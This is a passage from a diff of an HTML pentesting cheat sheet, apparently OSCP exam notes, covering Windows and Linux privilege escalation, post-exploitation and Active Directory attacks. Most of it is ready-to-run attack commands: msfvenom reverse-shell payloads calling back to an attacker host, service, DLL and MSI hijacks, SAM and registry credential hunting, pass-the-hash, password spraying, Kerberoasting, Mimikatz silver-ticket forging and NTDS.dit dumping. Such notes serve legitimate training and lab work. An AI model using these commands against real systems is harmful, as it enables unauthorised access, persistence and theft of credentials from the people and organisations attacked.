+reg add HKLM<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\s</span>ervices<span class="se">\r</span>egsvc /v ImagePath /t REG_EXPAND_SZ /d C:<span class="se">\P</span>rivEsc<span class="se">\r</span>everse.exe /f
+<span class="c">#Imagepath is the variable here</span>
+
+net start &lt;service&gt;
+</code></pre></div></div> <h2 id="dll-hijacking">DLL Hijacking</h2> <ol> <li>Find Missing DLLs using Process Monitor, Identify a specific service that looks suspicious, and add a filter.</li> <li>Check whether you have write permissions in the directory associated with the service.</li> </ol> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Create a reverse-shell</span>
+msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;attaker-IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;listening-port&gt; <span class="nt">-f</span> dll <span class="o">&gt;</span> filename.dll
+</code></pre></div></div> <ol> <li>Copy it to the victim machine and then move it to the service-associated directory.(Make sure the dll name is similar to the missing name)</li> <li>Start the listener and restart the service; you’ll get a shell.</li> </ol> <h2 id="autorun">Autorun</h2> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#For checking, it will display some information with file-location</span>
+reg query HKCU<span class="se">\S</span>oftware<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\C</span>urrentVersion<span class="se">\R</span>un
+reg query HKLM<span class="se">\S</span>oftware<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\C</span>urrentVersion<span class="se">\R</span>un
+
+<span class="c">#Check the location is writable</span>
+accesschk.exe <span class="se">\a</span>ccepteula <span class="nt">-wvu</span> <span class="s2">"&lt;path&gt;"</span> <span class="c">#returns FILE_ALL_ACCESS</span>
+
+<span class="c">#Replace the executable with the reverseshell and we need to wait till Admin logins, then we'll have shell</span>
+</code></pre></div></div> <h2 id="alwaysinstallelevated">AlwaysInstallElevated</h2> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#For checking, it should return 1 or Ox1</span>
+reg query HKCU<span class="se">\S</span>OFTWARE<span class="se">\P</span>olicies<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\I</span>nstaller /v AlwaysInstallElevated
+reg query HKLM<span class="se">\S</span>OFTWARE<span class="se">\P</span>olicies<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\I</span>nstaller /v AlwaysInstallElevated
+
+<span class="c">#Creating a reverseshell in msi format</span>
+msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;port&gt; <span class="nt">--platform</span> windows <span class="nt">-f</span> msi <span class="o">&gt;</span> reverse.msi
+
+<span class="c">#Execute and get shell</span>
+msiexec /quiet /qn /i reverse.msi
+</code></pre></div></div> <h2 id="schedules-tasks">Schedules Tasks</h2> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>schtasks /query /fo LIST /v <span class="c">#Displays list of scheduled tasks, Pickup any interesting one</span>
+<span class="c">#Permission check - Writable means exploitable!</span>
+icalcs <span class="s2">"path"</span>
+<span class="c">#Wait till the scheduled task in executed, then we'll get a shell</span>
+</code></pre></div></div> <h2 id="startup-apps">Startup Apps</h2> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\P</span>rogramData<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\S</span>tart Menu<span class="se">\P</span>rograms<span class="se">\S</span>tartUp <span class="c">#Startup applications can be found here</span>
+<span class="c">#Check writable permissions and transfer</span>
+<span class="c">#The only catch here is the system needs to be restarted</span>
+</code></pre></div></div> <h2 id="insecure-gui-apps">Insecure GUI apps</h2> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Check the applications that are running from "TaskManager" and obtain list of applications that are running as Privileged user</span>
+<span class="c">#Open that particular application, using "open" feature enter the following</span>
+file://c:/windows/system32/cmd.exe
+</code></pre></div></div> <h2 id="sam-and-system">SAM and SYSTEM</h2> <ul> <li>Check in the following folders</li> </ul> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Usually %SYSTEMROOT% = C:\Windows</span>
+%SYSTEMROOT%<span class="se">\r</span>epair<span class="se">\S</span>AM
+%SYSTEMROOT%<span class="se">\S</span>ystem32<span class="se">\c</span>onfig<span class="se">\R</span>egBack<span class="se">\S</span>AM
+%SYSTEMROOT%<span class="se">\S</span>ystem32<span class="se">\c</span>onfig<span class="se">\S</span>AM
+%SYSTEMROOT%<span class="se">\r</span>epair<span class="se">\s</span>ystem
+%SYSTEMROOT%<span class="se">\S</span>ystem32<span class="se">\c</span>onfig<span class="se">\S</span>YSTEM
+%SYSTEMROOT%<span class="se">\S</span>ystem32<span class="se">\c</span>onfig<span class="se">\R</span>egBack<span class="se">\s</span>ystem
+
+C:<span class="se">\w</span>indows.old
+
+<span class="c">#First go to c:</span>
+<span class="nb">dir</span> /s SAM
+<span class="nb">dir</span> /s SYSTEM
+</code></pre></div></div> <ul> <li>Obtaining Hashes from SYSTEM and SAM</li> </ul> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-secretsdump <span class="nt">-system</span> SYSTEM <span class="nt">-sam</span> SAM <span class="nb">local</span> <span class="c">#always mention local in the command</span>
+<span class="c">#Now a detailed list of hashes are displayed</span>
+</code></pre></div></div> <h2 id="passwords">Passwords</h2> <p><br/></p> <h3 id="sensitive-files">Sensitive files</h3> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>findstr /si password <span class="k">*</span>.txt
+findstr /si password <span class="k">*</span>.xml
+findstr /si password <span class="k">*</span>.ini
+Findstr /si password <span class="k">*</span>.config
+findstr /si pass/pwd <span class="k">*</span>.ini
+
+<span class="nb">dir</span> /s <span class="k">*</span>pass<span class="k">*</span> <span class="o">==</span> <span class="k">*</span>cred<span class="k">*</span> <span class="o">==</span> <span class="k">*</span>vnc<span class="k">*</span> <span class="o">==</span> <span class="k">*</span>.config<span class="k">*</span>
+
+<span class="k">in </span>all files
+findstr /spin <span class="s2">"password"</span> <span class="k">*</span>.<span class="k">*</span>
+findstr /spin <span class="s2">"password"</span> <span class="k">*</span>.<span class="k">*</span>
+</code></pre></div></div> <p><br/></p> <h3 id="config-files">Config files</h3> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:<span class="se">\s</span>ysprep.inf
+c:<span class="se">\s</span>ysprep<span class="se">\s</span>ysprep.xml
+c:<span class="se">\u</span>nattend.xml
+%WINDIR%<span class="se">\P</span>anther<span class="se">\U</span>nattend<span class="se">\U</span>nattended.xml
+%WINDIR%<span class="se">\P</span>anther<span class="se">\U</span>nattended.xml
+
+<span class="nb">dir</span> /b /s unattend.xml
+<span class="nb">dir</span> /b /s web.config
+<span class="nb">dir</span> /b /s sysprep.inf
+<span class="nb">dir</span> /b /s sysprep.xml
+<span class="nb">dir</span> /b /s <span class="k">*</span>pass<span class="k">*</span>
+
+<span class="nb">dir </span>c:<span class="se">\*</span>vnc.ini /s /b
+<span class="nb">dir </span>c:<span class="se">\*</span>ultravnc.ini /s /b
+<span class="nb">dir </span>c:<span class="se">\ </span>/s /b | findstr /si <span class="k">*</span>vnc.ini
+</code></pre></div></div> <p><br/></p> <h3 id="registry">Registry</h3> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg query HKLM /f password /t REG_SZ /s
+reg query <span class="s2">"HKLM</span><span class="se">\S</span><span class="s2">oftware</span><span class="se">\M</span><span class="s2">icrosoft</span><span class="se">\W</span><span class="s2">indows NT</span><span class="se">\C</span><span class="s2">urrentVersion</span><span class="se">\w</span><span class="s2">inlogon"</span>
+
+<span class="c">#Putty keys</span>
+reg query <span class="s2">"HKCU</span><span class="se">\S</span><span class="s2">oftware</span><span class="se">\S</span><span class="s2">imonTatham</span><span class="se">\P</span><span class="s2">uTTY</span><span class="se">\S</span><span class="s2">essions"</span>
+reg query <span class="s2">"HKCU</span><span class="se">\S</span><span class="s2">oftware</span><span class="se">\S</span><span class="s2">imonTatham</span><span class="se">\P</span><span class="s2">uTTY</span><span class="se">\S</span><span class="s2">essions"</span> /s | findstr <span class="s2">"HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername"</span> <span class="c">#Check the values saved in each session, user/password could be there</span>
+
+&lt;br&gt;
+
+<span class="c">### VNC</span>
+reg query <span class="s2">"HKCU</span><span class="se">\S</span><span class="s2">oftware</span><span class="se">\O</span><span class="s2">RL</span><span class="se">\W</span><span class="s2">inVNC3</span><span class="se">\P</span><span class="s2">assword"</span>
+reg query <span class="s2">"HKCU</span><span class="se">\S</span><span class="s2">oftware</span><span class="se">\T</span><span class="s2">ightVNC</span><span class="se">\S</span><span class="s2">erver"</span>
+
+&lt;br&gt;
+
+<span class="c">### Windows autologin</span>
+reg query <span class="s2">"HKLM</span><span class="se">\S</span><span class="s2">OFTWARE</span><span class="se">\M</span><span class="s2">icrosoft</span><span class="se">\W</span><span class="s2">indows NT</span><span class="se">\C</span><span class="s2">urrentversion</span><span class="se">\W</span><span class="s2">inlogon"</span>
+reg query <span class="s2">"HKLM</span><span class="se">\S</span><span class="s2">OFTWARE</span><span class="se">\M</span><span class="s2">icrosoft</span><span class="se">\W</span><span class="s2">indows NT</span><span class="se">\C</span><span class="s2">urrentversion</span><span class="se">\W</span><span class="s2">inlogon"</span> 2&gt;nul | findstr <span class="s2">"DefaultUserName DefaultDomainName DefaultPassword"</span>
+
+&lt;br&gt;
+
+<span class="c">### SNMP Parameters</span>
+reg query <span class="s2">"HKLM</span><span class="se">\S</span><span class="s2">YSTEM</span><span class="se">\C</span><span class="s2">urrent</span><span class="se">\C</span><span class="s2">ontrolSet</span><span class="se">\S</span><span class="s2">ervices</span><span class="se">\S</span><span class="s2">NMP"</span>
+
+&lt;br&gt;
+
+<span class="c">### Putty</span>
+reg query <span class="s2">"HKCU</span><span class="se">\S</span><span class="s2">oftware</span><span class="se">\S</span><span class="s2">imonTatham</span><span class="se">\P</span><span class="s2">uTTY</span><span class="se">\S</span><span class="s2">essions"</span>
+
+&lt;br&gt;
+
+<span class="c">### Search for the password in the registry</span>
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+</code></pre></div></div> <p><br/></p> <h3 id="runas---savedcreds">RunAs - Savedcreds</h3> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cmdkey /list <span class="c">#Displays stored credentials looks for any optential users</span>
+<span class="c">#Transfer the reverseshell</span>
+runas /savecred /user:admin C:<span class="se">\T</span>emp<span class="se">\r</span>everse.exe
+</code></pre></div></div> <p><br/></p> <h3 id="pass-the-hash">Pass the Hash</h3> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#If hashes are obtained through some means, then use psexec and smbexec and obtain the shell as a different user.</span>
+pth-winexe <span class="nt">-U</span> JEEVES/administrator%aad3b43XXXXXXXX35b51404ee:e0fb1fb857XXXXXXXX238cbe81fe00 //10.129.26.210 cmd.exe
+</code></pre></div></div> <hr/> <h1 id="linux-privilege-escalation">Linux Privilege Escalation</h1> <ul> <li><a href="https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa">Privesc through TAR wildcard</a></li> </ul> <h2 id="tty-shell">TTY Shell</h2> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+python3 <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+<span class="nb">echo</span> <span class="s1">'os.system('</span>/bin/bash<span class="s1">')'</span>
+/bin/sh <span class="nt">-i</span>
+/bin/bash <span class="nt">-i</span>
+perl <span class="nt">-e</span> <span class="s1">'exec "/bin/sh";'</span>
+</code></pre></div></div> <h2 id="basic">Basic</h2> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-writable</span> <span class="nt">-type</span> d 2&gt;/dev/null
+dpkg <span class="nt">-l</span> <span class="c">#Installed applications on Debian system</span>
+<span class="nb">cat</span> /etc/fstab <span class="c">#Listing mounted drives</span>
+lsblk <span class="c">#Listing all available drives</span>
+lsmod <span class="c">#Listing loaded drivers</span>
+
+watch <span class="nt">-n</span> 1 <span class="s2">"ps -aux | grep pass"</span> <span class="c">#Checking processes for credentials</span>
+<span class="nb">sudo </span>tcpdump <span class="nt">-i</span> lo <span class="nt">-A</span> | <span class="nb">grep</span> <span class="s2">"pass"</span> <span class="c">#Password sniffing using tcpdump</span>
+
+</code></pre></div></div> <h2 id="automated-scripts-1">Automated Scripts</h2> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>linPEAS.sh
+LinEnum.sh
+linuxprivchecker.py
+unix-privesc-check
+Mestaploit: multi/recon/local_exploit_suggester
+</code></pre></div></div> <h2 id="sensitive-information">Sensitive Information</h2> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> .bashrc
+<span class="nb">env</span> <span class="c">#checking environment variables</span>
+watch <span class="nt">-n</span> 1 <span class="s2">"ps -aux | grep pass"</span> <span class="c">#Harvesting active processes for credentials</span>
+<span class="c"># Process-related information can also be obtained from PSPY</span>
+</code></pre></div></div> <h2 id="sudosuidcapabilities">Sudo/SUID/Capabilities</h2> <p><a href="https://gtfobins.github.io/">GTFOBins</a></p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-l</span>
+find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null
+getcap <span class="nt">-r</span> / 2&gt;/dev/null
+</code></pre></div></div> <h2 id="cron-jobs">Cron Jobs</h2> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Detecting Cronjobs</span>
+<span class="nb">cat</span> /etc/crontab
+crontab <span class="nt">-l</span>
+
+pspy <span class="c">#handy tool to live monitor stuff happening in Linux</span>
+
+<span class="nb">grep</span> <span class="s2">"CRON"</span> /var/log/syslog <span class="c">#inspecting cron logs</span>
+</code></pre></div></div> <h2 id="nfs">NFS</h2> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">##Mountable shares</span>
+<span class="nb">cat</span> /etc/exports <span class="c">#On target</span>
+showmount <span class="nt">-e</span> &lt;target IP&gt; <span class="c">#On attacker</span>
+<span class="c">###Check for "no_root_squash" in the output of shares</span>
+
+mount <span class="nt">-o</span> rw &lt;targetIP&gt;:&lt;share-location&gt; &lt;directory path we created&gt;
+<span class="c">#Now create a binary there</span>
+<span class="nb">chmod</span> +x &lt;binary&gt;
+</code></pre></div></div> <hr/> <h1 id="post-exploitation">Post Exploitation</h1> <blockquote> <p>This is more Windows-specific as exam-specific.</p> </blockquote> <aside> 💡 Run WinPEAS.exe - This may give us some more detailed information as no, we’re a privileged user, and we can open several files, which gives us some edge! </aside> <h2 id="sensitive-information-1">Sensitive Information</h2> <p><br/></p> <h3 id="powershell-history">Powershell History</h3> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">type</span> %userprofile%<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\P</span>owerShell<span class="se">\P</span>SReadline<span class="se">\C</span>onsoleHost_history.txt
+
+<span class="c">#Example</span>
+<span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\s</span>athvik<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\P</span>owerShell<span class="se">\P</span>SReadline<span class="se">\C</span>onsoleHost_history.txt
+</code></pre></div></div> <p><br/></p> <h3 id="searching-for-passwords">Searching for passwords</h3> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">dir</span> .s <span class="k">*</span>pass<span class="k">*</span> <span class="o">==</span> <span class="k">*</span>.config
+findstr /si password <span class="k">*</span>.xml <span class="k">*</span>.ini <span class="k">*</span>.txt
+</code></pre></div></div> <p><br/></p> <h3 id="searching-in-registry-for-passwords">Searching in Registry for Passwords</h3> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+</code></pre></div></div> <aside> 💡 Always check document folders, they may contain some juicy files </aside> <p><br/></p> <h3 id="kdbx-files">KDBX Files</h3> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#These are KeyPassX password-stored files</span>
+cmd&gt; <span class="nb">dir</span> /s /b <span class="k">*</span>.kdbx
+Ps&gt; Get-ChildItem <span class="nt">-Recurse</span> <span class="nt">-Filter</span> <span class="k">*</span>.kdbx
+
+<span class="c">#Cracking</span>
+keepass2john Database.kdbx <span class="o">&gt;</span> keepasshash
+john <span class="nt">--wordlist</span><span class="o">=</span>/home/sathvik/Wordlists/rockyou.txt keepasshash
+</code></pre></div></div> <h2 id="dumping-hashes">Dumping Hashes</h2> <ol> <li>Use Mimikatz</li> <li>If this is a domain-joined machine, run BloodHound.</li> </ol> <hr/> <h1 id="active-directory-pentesting">Active Directory Pentesting</h1> <aside> 💡 We perform the following stuff once we’re in the AD network </aside> <h2 id="enumeration">Enumeration</h2> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net localgroup Administrators <span class="c">#to check local admins</span>
+</code></pre></div></div> <p><br/></p> <h3 id="powerview">Powerview</h3> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .<span class="se">\P</span>owerView.ps1 <span class="c">#loading module to powershell, if it gives an error then change the execution policy</span>
+Get-NetDomain <span class="c">#basic information about the domain</span>
+Get-NetUser <span class="c">#list of all users in the domain</span>
+<span class="c"># The above command's outputs can be filtered using "select" command. For example, "Get-NetUser | select cn", here cn is a sideheading for the output of the above command. we can select any number of them seperated by comma.</span>
+Get-NetGroup <span class="c"># enumerate domain groups</span>
+Get-NetGroup <span class="s2">"group name"</span> <span class="c"># information from specific group</span>
+Get-NetComputer <span class="c"># enumerate the computer objects in the domain</span>
+Find-LocalAdminAccess <span class="c"># scans the network in an attempt to determine if our current user has administrative permissions on any computers in the domain</span>
+Get-NetSession <span class="nt">-ComputerName</span> files04 <span class="nt">-Verbose</span> <span class="c">#Checking logged on users with Get-NetSession, adding verbosity gives more info.</span>
+Get-NetUser <span class="nt">-SPN</span> | <span class="k">select </span>samaccountname,serviceprincipalname <span class="c"># Listing SPN accounts in domain</span>
+Get-ObjectAcl <span class="nt">-Identity</span> &lt;user&gt; <span class="c"># enumerates ACE(access control entities), lists SID(security identifier). ObjectSID</span>
+Convert-SidToName &lt;sid/objsid&gt; <span class="c"># converting SID/ObjSID to name</span>
+
+<span class="c"># Checking for "GenericAll" right for a specific group, after obtaining they can be converted using convert-sidtoname</span>
+Get-ObjectAcl <span class="nt">-Identity</span> <span class="s2">"group-name"</span> | ? <span class="o">{</span><span class="nv">$_</span>.ActiveDirectoryRights <span class="nt">-eq</span> <span class="s2">"GenericAll"</span><span class="o">}</span> | <span class="k">select </span>SecurityIdentifier,ActiveDirectoryRights
+
+Find-DomainShare <span class="c">#find the shares in the domain</span>
+
+Get-DomainUser <span class="nt">-PreauthNotRequired</span> <span class="nt">-verbose</span> <span class="c"># identifying AS-REP roastable accounts</span>
+
+Get-NetUser <span class="nt">-SPN</span> | <span class="k">select </span>serviceprincipalname <span class="c">#Kerberoastable accounts</span>
+</code></pre></div></div> <p><br/></p> <h3 id="bloodhound">Bloodhound</h3> <ul> <li>Collection methods - database</li> </ul> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Sharphound - transfer sharphound.ps1 into the compromised machine</span>
+Import-Module .<span class="se">\S</span>harphound.ps1
+Invoke-BloodHound <span class="nt">-CollectionMethod</span> All <span class="nt">-OutputDirectory</span> &lt;location&gt; <span class="nt">-OutputPrefix</span> <span class="s2">"name"</span> <span class="c"># collects and saved with the specified details, output will be saved in windows compromised machine</span>
+
+<span class="c"># Bloodhound-Python</span>
+bloodhound-python <span class="nt">-u</span> <span class="s1">'uname'</span> <span class="nt">-p</span> <span class="s1">'pass'</span> <span class="nt">-ns</span> &lt;rhost&gt; <span class="nt">-d</span> &lt;domain-name&gt; <span class="nt">-c</span> all <span class="c">#output will be saved in you kali machine</span>
+</code></pre></div></div> <ul> <li>Running Bloodhound</li> </ul> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>neo4j console
+<span class="c"># then upload the .json files obtained</span>
+</code></pre></div></div> <p><br/></p> <h3 id="ldapdomaindump">LDAPDOMAINDUMP</h3> <ul> <li>These files contain information in a well-structured webpage format.</li> </ul> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>ldapdomaindump ldaps://&lt;IP&gt; <span class="nt">-u</span> <span class="s1">'username'</span> <span class="nt">-p</span> <span class="s1">'password'</span> <span class="c">#Do this in a new folder</span>
+</code></pre></div></div> <p><br/></p> <h3 id="plumhound">PlumHound</h3> <ul> <li>Link: https://github.com/PlumHound/PlumHound install from the steps mentioned.</li> <li>Keep both Bloodhound and Neo4j running as this tool acquires information from them.</li> </ul> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>python3 plumhound.py <span class="nt">--easy</span> <span class="nt">-p</span> &lt;neo4j-password&gt; <span class="c">#Testing connection</span>
+python3 PlumHound.py <span class="nt">-x</span> tasks/default.tasks <span class="nt">-p</span> &lt;neo4jpass&gt; <span class="c">#Open index.html as once this command is completed it produces somany files</span>
+firefox index.html
+</code></pre></div></div> <p><br/></p> <h3 id="pingcastle">PingCastle</h3> <ul> <li><a href="http://www.pingcastle.com">www.pingcastle.com</a> - Download Zip file from here.</li> <li>This needs to be run on windows machine, just hit enter and give the domain to scan.</li> <li>It gives a report at the end of the scan.</li> </ul> <p><br/></p> <h3 id="psloggedon">PsLoggedon</h3> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># To see user logons at remote system of a domain(external tool)</span>
+.<span class="se">\P</span>sLoggedon.exe <span class="se">\\</span>&lt;computername&gt;
+</code></pre></div></div> <p><br/></p> <h3 id="gpp-or-cpassword">GPP or CPassword</h3> <ul> <li>Impacket</li> </ul> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># with a NULL session</span>
+Get-GPPPassword.py <span class="nt">-no-pass</span> <span class="s1">'DOMAIN_CONTROLLER'</span>
+
+<span class="c"># with cleartext credentials</span>
+Get-GPPPassword.py <span class="s1">'DOMAIN'</span>/<span class="s1">'USER'</span>:<span class="s1">'PASSWORD'</span>@<span class="s1">'DOMAIN_CONTROLLER'</span>
+
+<span class="c"># pass-the-hash (with an NT hash)</span>
+Get-GPPPassword.py <span class="nt">-hashes</span> :<span class="s1">'NThash'</span> <span class="s1">'DOMAIN'</span>/<span class="s1">'USER'</span>:<span class="s1">'PASSWORD'</span>@<span class="s1">'DOMAIN_CONTROLLER'</span>
+
+<span class="c"># parse a local file</span>
+Get-GPPPassword.py <span class="nt">-xmlfile</span> <span class="s1">'/path/to/Policy.xml'</span> <span class="s1">'LOCAL'</span>
+</code></pre></div></div> <ul> <li>SMB share - If SYSVOL share or any share which <code class="language-plaintext highlighter-rouge">domain</code> name as folder name</li> </ul> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Download the whole share</span>
+https://github.com/ahmetgurel/Pentest-Hints/blob/master/AD%20Hunting%20Passwords%20In%20SYSVOL.md
+<span class="c">#Navigate to the downloaded folder</span>
+<span class="nb">grep</span> <span class="nt">-inr</span> <span class="s2">"cpassword"</span>
+</code></pre></div></div> <ul> <li>Crackmapexec</li> </ul> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb &lt;TARGET[s]&gt; <span class="nt">-u</span> &lt;USERNAME&gt; <span class="nt">-p</span> &lt;PASSWORD&gt; <span class="nt">-d</span> &lt;DOMAIN&gt; <span class="nt">-M</span> gpp_password
+crackmapexec smb &lt;TARGET[s]&gt; <span class="nt">-u</span> &lt;USERNAME&gt; <span class="nt">-H</span> LMHash:NTLMHash <span class="nt">-d</span> &lt;DOMAIN&gt; <span class="nt">-M</span> gpp_password
+</code></pre></div></div> <ul> <li>Decrypting the CPassword</li> </ul> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gpp-decrypt <span class="s2">"cpassword"</span>
+</code></pre></div></div> <h2 id="attacking-active-directory"><strong>Attacking Active Directory</strong></h2> <aside> 💡 Make sure you obtain all the relevant credentials from compromised systems, we cannot survive if we don’t have proper creds. </aside> <p><br/></p> <h3 id="zerologon">Zerologon</h3> <ul> <li><a href="https://github.com/VoidSec/CVE-2020-1472">Exploit</a></li> <li>We can dump hashes on target even without any credentials.</li> </ul> <p><br/></p> <h3 id="password-spraying">Password Spraying</h3> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Crackmapexec - check if the output shows 'Pwned!'</span>
+crackmapexec smb &lt;IP or subnet&gt; <span class="nt">-u</span> users.txt <span class="nt">-p</span> <span class="s1">'pass'</span> <span class="nt">-d</span> &lt;domain&gt; <span class="nt">--continue-on-success</span> <span class="c">#use continue-on-success option if it's subnet</span>
+
+<span class="c"># Kerbrute</span>
+kerbrute passwordspray <span class="nt">-d</span> corp.com .<span class="se">\u</span>sernames.txt <span class="s2">"pass"</span>
+</code></pre></div></div> <p><br/></p> <h3 id="as-rep-roasting">AS-REP Roasting</h3> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-GetNPUsers <span class="nt">-dc-ip</span> &lt;DC-IP&gt; &lt;domain&gt;/&lt;user&gt;:&lt;pass&gt; <span class="nt">-request</span> <span class="c">#this gives us the hash of AS-REP Roastable accounts, from kali linux</span>
+.<span class="se">\R</span>ubeus.exe asreproast /nowrap <span class="c">#dumping from compromised windows host</span>
+
+hashcat <span class="nt">-m</span> 18200 hashes.txt wordlist.txt <span class="nt">--force</span> <span class="c"># cracking hashes</span>
+</code></pre></div></div> <p><br/></p> <h3 id="kerberoasting">Kerberoasting</h3> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.<span class="se">\R</span>ubeus.exe kerberoast /outfile:hashes.kerberoast <span class="c">#dumping from compromised windows host, and saving with customname</span>
+
+impacket-GetUserSPNs <span class="nt">-dc-ip</span> &lt;DC-IP&gt; &lt;domain&gt;/&lt;user&gt;:&lt;pass&gt; <span class="nt">-request</span> <span class="c">#from kali machine</span>
+
+hashcat <span class="nt">-m</span> 13100 hashes.txt wordlist.txt <span class="nt">--force</span> <span class="c"># cracking hashes</span>
+</code></pre></div></div> <p><br/></p> <h3 id="silver-tickets">Silver Tickets</h3> <ul> <li>Obtaining hash of an SPN user using <strong>Mimikatz</strong></li> </ul> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>privilege::debug
+sekurlsa::logonpasswords <span class="c">#obtain NTLM hash of the SPN account here</span>
+</code></pre></div></div> <ul> <li>Obtaining Domain SID</li> </ul> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ps&gt; <span class="nb">whoami</span> /user
+<span class="c"># this gives SID of the user that we're logged in as. If the user SID is "S-1-5-21-1987370270-658905905-1781884369-1105" then the domain   SID is "S-1-5-21-1987370270-658905905-1781884369"</span>
+</code></pre></div></div> <ul> <li>Forging silver ticket Ft <strong>Mimikatz</strong></li> </ul> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kerberos::golden /sid:&lt;domainSID&gt; /domain:&lt;domain-name&gt; /ptt /target:&lt;targetsystem.domain&gt; /service:&lt;service-name&gt; /rc4:&lt;NTLM-hash&gt; /user:&lt;new-user&gt;
+<span class="nb">exit</span>
+
+<span class="c"># we can check the tickets by,</span>
+ps&gt; klist
+</code></pre></div></div> <ul> <li>Accessing service</li> </ul> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ps&gt; iwr <span class="nt">-UseDefaultCredentials</span> &lt;servicename&gt;://&lt;computername&gt;
+</code></pre></div></div> <p><br/></p> <h3 id="secretsdump">Secretsdump</h3> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>secretsdump.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;IP&gt;
+secretsdump.py <span class="nb">uname</span>@IP <span class="nt">-hashes</span> lmhash:ntlmhash <span class="c">#local user</span>
+secretsdump.py domain/uname@IP <span class="nt">-hashes</span> lmhash:ntlmhash <span class="c">#domain user</span>
+</code></pre></div></div> <p><br/></p> <h3 id="dumping-ntdsdit">Dumping NTDS.dit</h3> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>secretsdump.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;IP&gt; <span class="nt">-just-dc-ntlm</span>
+<span class="c">#use -just-dc-ntlm option with any of the secretsdump command to dump ntds.dit</span>
